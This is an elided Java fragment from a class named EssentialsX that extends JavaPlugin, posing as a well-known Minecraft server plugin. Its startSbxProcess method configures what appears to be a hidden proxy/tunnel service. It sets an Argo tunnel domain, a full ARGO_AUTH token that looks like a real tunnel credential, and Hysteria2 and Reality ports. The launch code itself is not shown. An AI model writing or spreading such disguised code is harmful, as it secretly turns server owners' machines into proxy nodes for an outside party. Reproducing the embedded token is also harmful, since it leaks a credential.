...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("ARGO_PORT", "8008");
        env.put("ARGO_DOMAIN", "data.gbw.xx.kg");
        env.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiYmU2YzQ3MmQtZWRlNi00Y2MxLTlhYzctZmZmM2M5NWJhN2ZhIiwicyI6IllqWTJZak5qTm1JdE56QTJOUzAwTVROa0xXRXpOV010T1RKallqSTVOV1ZsTlRFNSJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "50088");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "50088");
